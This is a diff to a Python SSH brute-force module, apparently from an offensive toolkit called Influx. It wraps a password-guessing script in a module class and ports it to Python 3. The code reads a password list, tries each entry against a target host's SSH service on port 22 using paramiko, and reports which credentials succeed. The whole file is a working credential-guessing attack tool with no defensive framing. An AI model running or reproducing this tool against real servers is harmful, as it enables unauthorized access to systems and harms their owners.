@@ -7,12 +7,23 @@ import paramiko
 #Influx Default Modules Import
 Modules_Path = os.path.abspath(os.path.join('..', '..', 'Modules'))
 sys.path.append(Modules_Path)
-from InfluxPrint import *
+from Modules.InfluxPrint import *
+from Modules.InfluxExceptions import *
+
+class infmod:
+   #Influx Section
+   def __init__(self):
+       self.name = "SSH BruteForce"
+       self.description = "This Module Will BruteForce A SSH Server With The Given Username And The Password File\n"
+       self.parameters = {"Host":None, "Username":None, "PasswordFile":None}
+
+   def __str__(self):
+       return "[" + self.name + "] Influx Module Object."
+
+   def run(self):
+     influx_module_main(self.parameters)
 
 #Defining Functions
-def show_help():
-   print(Status.INFO + "Usage:")
-   print("{0} Host Username PasswordFile".format(sys.argv[0]))
 
 def ssh_connect(username, password, stat = 0):
    ssh = paramiko.SSHClient();
@@ -22,62 +33,59 @@ def ssh_connect(username, password, stat = 0):
       ssh.connect(host, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
       stat = 1
-   except socket.error, e:
+   except socket.error as e:
       stat = 2
    ssh.close()
    return stat
 
-#Main Code
-global host
-try:
-   host = sys.argv[1]
-   username = sys.argv[2]
-   passfile = sys.argv[3]
-   if os.path.exists(passfile) == False:
- 	  print(Status.ERROR +"Password File Does Not Exist.")
- 	  sys.exit(4)
-except Exception:
-	show_help()
-	sys.exit(4)
-print(Status.INFO +"SSH BruteForcer")
-print(Status.INFO +"Host: " + host)
-print(Status.INFO +"Username: " + username)
-print(Status.INFO +"Passwords: " + passfile)
-print("")
-print(Status.JOB +"BruteForce Started")
-print("")
-print("----------------------------------------------")
-print("")
-passwords = open(passfile);
-for password in passwords:
-   password = password.strip("\n");
-   try:
-      res = ssh_connect(username, password)
-      if res == 1:
-         print (Color.RED + "[+]Auth Faild" + Color.ENDC, end=" ")
-         print(": User:{0} Pass:{1}".format(username, password))
+def influx_module_main(prams):
+    global host
+    try:
+       host = prams["Host"]
+       username = prams["Username"]
+       passfile = prams["PasswordFile"]
+       if os.path.exists(passfile) == False:
+          print(Status["ERROR"] +"Password File Does Not Exist.")
+          raise StopModuleException("Password File Does Not Exist")
+    except Exception as e:
+        print(Status["ERROR"] + "Something Went Wrong.")
+        raise StopModuleException(e)
+        print("")
+    print(Status["INFO"] +"SSH BruteForcer")
+    print(Status["INFO"] +"Host: " + host)
+    print(Status["INFO"] +"Username: " + username)
+    print(Status["INFO"] +"Passwords: " + passfile)
+    print("")
+    print(Status["JOB"] +"BruteForce Started")
+    print("")
+    print("----------------------------------------------")
+    print("")
+    passwords = open(passfile);
+    for password in passwords:
+       password = password.strip("\n");
+       try:
+          res = ssh_connect(username, password)
+          if res == 1:
+             print (Color["RED"] + "[+]Auth Faild" + Color["ENDC"], end=" ")
+             print(": User:{0} Pass:{1}".format(username, password))
 
-      if res == 2:
-         print(Status.ERROR +"Error:Host Down")
-         sys.exit(2)
+          if res == 2:
+             print(Status["ERROR"] +"Host Down")
 
-      if res == 0:
-         print (Color.GREEN + "[+]Auth Succeed" + Color.ENDC, end=" ") 
-         print(":Password Found: User:{0} Pass:{1}".format(username, password))
-   except Exception, e:
-      print(Status.ERROR +"Error:" + e)
-      pass
-   except KeyboardInterrupt:
-   	  print("")
-   	  print(Status.INFO +"User Interrupted The Proccess")
-   	  print(Status.INFO +"Job Finished!")
-   	  print(Status.INFO +"Coded By The Nonexistent")
-   	  sys.exit()
+          if res == 0:
+             print (Color["GREEN"] + "[+]Auth Succeed" + Color["ENDC"], end=" ")
+             print(":Password Found: User:{0} Pass:{1}".format(username, password))
+       except Exception as e:
+          print(Status["ERROR"] +"Error:" + str(e))
+          pass
+       except KeyboardInterrupt:
+       	  print("")
+       	  print(Status["INFO"] +"User Interrupted The Proccess")
+       	  print(Status["INFO"] +"Job Finished!")
+          raise ModuleKeyboardInterrupt()
 
-passwords.close()
-print("")
-print("----------------------------------------------")
-print("")
-print(Status.INFO +"Job Finished!")
-print(Status.INFO +"Coded By The Nonexistent")
-sys.exit(0)
+    passwords.close()
+    print("")
+    print("----------------------------------------------")
+    print("")
+    print(Status["INFO"] +"Job Finished!")
